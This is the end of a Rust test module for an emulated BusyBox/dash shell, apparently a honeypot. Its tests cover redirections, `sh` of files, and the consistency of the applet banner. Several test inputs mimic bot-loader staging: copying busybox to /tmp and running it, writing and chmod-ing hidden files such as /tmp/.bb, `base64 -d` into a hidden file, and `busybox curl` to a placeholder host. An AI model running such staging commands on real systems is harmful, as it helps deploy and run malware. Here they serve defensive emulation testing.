            ("cp a b", "cp: cannot stat 'a': No such file or directory\n"),
            ("rm x", "rm: cannot remove 'x': No such file or directory\n"),
        ] {
            let (o, _) = shell().handle_input(cmd);
            assert_eq!(o, expected, "{cmd}");
            assert!(!o.contains("command not found"));
        }
    }

    /// `cp /bin/busybox x && ./x` is a standard staging step; it needs a busybox to copy.
    #[test]
    fn the_binaries_a_loader_copies_exist_and_are_executable() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(sh.handle_input("cp /bin/busybox ./b").0, "");
        assert_eq!(sh.handle_input("./b").0, "", "the copy runs");
        assert_eq!(sh.handle_input("ls /tmp").0, "b\n");
    }

    #[test]
    fn busybox_chmod_dispatches_instead_of_applet_not_found() {
        // The banner advertises chmod; `busybox chmod` must run it, not contradict the banner.
        let (out, _) = shell().handle_input("busybox chmod +x x");
        assert_eq!(out, "");
    }

    #[test]
    fn busybox_banner_and_applet_set_never_contradict() {
        // Both are derived from BUSYBOX_APPLETS, so every advertised applet is recognized and every
        // recognized applet is advertised - the banner-vs-applet contradiction is impossible.
        let banner = busybox_banner();
        for applet in BUSYBOX_APPLETS {
            assert!(
                is_busybox_applet(applet),
                "{applet} advertised but not recognized"
            );
            assert!(
                banner.contains(applet),
                "{applet} recognized but not advertised"
            );
        }
        // curl is not a real BusyBox applet, so `busybox curl` is applet-not-found and it is absent
        // from the banner.
        assert!(!is_busybox_applet("curl"));
        assert!(!banner.contains("curl"));
        let (out, _) = shell().handle_input("busybox curl http://x/y");
        assert!(out.contains("curl: applet not found"), "got: {out}");
    }

    #[test]
    fn redirect_truncates_stdout_into_a_file() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("cd /tmp").0, "");
        assert_eq!(sh.handle_input("echo hi > /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "hi\n");
        // A second `>` replaces the content rather than extending it.
        assert_eq!(sh.handle_input("echo yo > /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "yo\n");
        // A command that prints nothing still truncates, as the shell opens the file first.
        assert_eq!(sh.handle_input("true > /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "");
    }

    #[test]
    fn redirect_append_adds_to_existing() {
        let mut sh = shell();
        sh.handle_input("echo a > /tmp/f");
        assert_eq!(sh.handle_input("echo b >> /tmp/f").0, "");
        assert_eq!(sh.handle_input("cat /tmp/f").0, "a\nb\n");
    }

    #[test]
    fn busybox_echo_redirect_writes_one_newline_and_prints_nothing() {
        let mut sh = shell();
        assert_eq!(sh.handle_input("/bin/busybox echo > /tmp/.fxcat").0, "");
        assert_eq!(sh.handle_input("cat /tmp/.fxcat").0, "\n");
        let r = sh.handle_input("sh /tmp/.fxcat").0;
        assert_eq!(r, "");
        assert_eq!(r.status, 0);
    }

    #[test]
    fn sh_of_blank_or_comment_only_file_exits_zero_silently() {
        let mut sh = shell();
        sh.handle_input("echo > /tmp/blank");
        assert_eq!(sh.handle_input("sh /tmp/blank").0, "");
        sh.handle_input("echo '# just a comment' > /tmp/c");
        let r = sh.handle_input("sh /tmp/c").0;
        assert_eq!(r, "");
        assert_eq!(r.status, 0);
        assert!(super::is_blank_or_comment_only("\n"));
        assert!(super::is_blank_or_comment_only(""));
        assert!(super::is_blank_or_comment_only("   \n#x\n"));
        assert!(!super::is_blank_or_comment_only("id\n"));
    }

    #[test]
    fn sh_of_a_file_with_real_content_exits_zero_unparsed() {
        let mut sh = shell();
        sh.handle_input("echo id > /tmp/s");
        let r = sh.handle_input("sh /tmp/s").0;
        assert_eq!(r, "");
        assert_eq!(r.status, 0);
        assert!(!r.contains("uid=0"));
    }

    #[test]
    fn sh_of_a_missing_file_gives_the_dash_open_error() {
        let mut sh = shell();
        let r = sh.handle_input("sh /tmp/nope").0;
        assert_eq!(r, "sh: 0: cannot open /tmp/nope: No such file\n");
        assert_eq!(r.status, 2);
    }

    #[test]
    fn sh_dash_c_with_an_empty_script_is_not_a_file_open() {
        let mut sh = shell();
        let r = sh.handle_input("sh -c \"\"").0;
        assert_eq!(r, "");
        assert_eq!(r.status, 0);
    }

    #[test]
    fn stderr_redirect_discards_via_dev_null_and_merges_via_2to1() {
        let mut sh = shell();
        sh.handle_input("cd /tmp");
        assert_eq!(sh.handle_input("ls /missing_q 2>/dev/null").0, "");
        assert_eq!(sh.handle_input("ls /missing_q 2>/dev/null").0.status, 2);
        assert_eq!(sh.handle_input("ls /missing_q > /tmp/o 2>&1").0, "");
        assert_eq!(
            sh.handle_input("cat /tmp/o").0,
            "ls: cannot access '/missing_q': No such file or directory\n"
        );
    }

    #[test]
    fn redirect_target_is_created_even_when_the_command_fails() {
        let mut sh = shell();
        sh.handle_input("cd /tmp");
        assert_eq!(
            sh.handle_input("cat /missing_q > /tmp/.bb").0,
            "cat: /missing_q: No such file or directory\n"
        );
        assert_eq!(sh.handle_input("chmod 755 /tmp/.bb").0, "");
        assert_eq!(sh.handle_input("/tmp/.bb").0, "");
    }

    #[test]
    fn redirect_into_a_missing_directory_errors_and_blocks_the_command() {
        let mut sh = shell();
        let r = sh.handle_input("echo hi > /nope/f").0;
        assert_eq!(r, "-bash: /nope/f: No such file or directory\n");
        assert_eq!(r.status, 1);
        assert!(sh.handle_input("ls /nope").0.contains("No such file"));
    }

    #[test]
    fn word_attached_redirect_stays_a_literal_argument() {
        use super::{Redirected, split_redirections};
        let Redirected { argv, redirs } = split_redirections(&["cat", "i>ii"]);
        assert_eq!(argv, vec!["cat", "i>ii"]);
        assert!(redirs.is_empty());
        let mut sh = shell();
        sh.handle_input("cd /var");
        assert_eq!(
            sh.handle_input("cat i>ii").0,
            "cat: i>ii: No such file or directory\n"
        );
    }

    #[test]
    fn pipeline_redirect_belongs_to_the_last_stage_and_is_ignored() {
        let mut sh = shell();
        assert!(
            sh.handle_input("printf x | base64 -d > /tmp/.s")
                .0
                .contains("not found")
        );
        assert!(sh.handle_input("cat /tmp/.s").0.contains("No such file"));
        assert_eq!(
            super::first_pipeline_stage(&["id", "|", "grep", "uid"]),
            &["id"]
        );
        assert_eq!(
            super::first_pipeline_stage(&["cat", "/bin/ls|head", "-n", "1"]),
            &["cat", "/bin/ls|head", "-n", "1"]
        );
    }

    #[test]
    fn split_redirections_classifies_every_form() {
        use super::{RedirKind, split_redirections};
        let r = split_redirections(&["echo", "a", ">", "f"]);
        assert_eq!(r.argv, vec!["echo", "a"]);
        assert_eq!(r.redirs.len(), 1);
        assert!(matches!(
            r.redirs[0].kind,
            RedirKind::File {
                target: "f",
                append: false
            }
        ));
        assert_eq!(
            split_redirections(&["echo", ">>f"]).redirs[0].kind,
            RedirKind::File {
                target: "f",
                append: true
            }
        );
        let two = split_redirections(&["x", "2>e"]);
        assert_eq!(two.redirs[0].fd, 2);
        assert_eq!(
            split_redirections(&["x", "2>&1"]).redirs[0].kind,
            RedirKind::Dup(1)
        );
        assert_eq!(
            split_redirections(&["x", "2>&-"]).redirs[0].kind,
            RedirKind::Close
        );
        assert!(matches!(
            split_redirections(&["x", ">/dev/null"]).redirs[0].kind,
            RedirKind::File {
                target: "/dev/null",
                ..
            }
        ));
        assert!(split_redirections(&["cat", "<in"]).redirs.is_empty());
        assert_eq!(split_redirections(&["cat", "<in"]).argv, vec!["cat"]);
        assert_eq!(
            split_redirections(&["cat", "<", "in", "x"]).argv,
            vec!["cat", "x"]
        );
    }
}
